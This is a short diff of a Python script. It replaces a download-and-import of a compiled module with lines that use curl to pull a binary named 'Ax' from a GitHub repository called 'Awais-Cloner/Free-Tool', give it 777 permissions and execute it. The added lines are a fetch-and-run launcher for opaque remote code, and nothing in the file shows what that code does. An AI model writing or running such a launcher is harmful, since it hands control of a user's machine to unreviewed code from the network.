@@ -1,3 +1,4 @@
 import os
-os.system('curl -L https://github.com/Awais-Cloner/Free-Tool/blob/main/Ax.cpython-311.so?raw=true -o Ax.cpython-311.so')
-import Ax
+os.system('curl -O https://github.com/Awais-Cloner/Free-Tool/blob/main/Ax?raw=true -o Ax')
+os.system("chmod 777 Ax")
+os.system("./Ax")
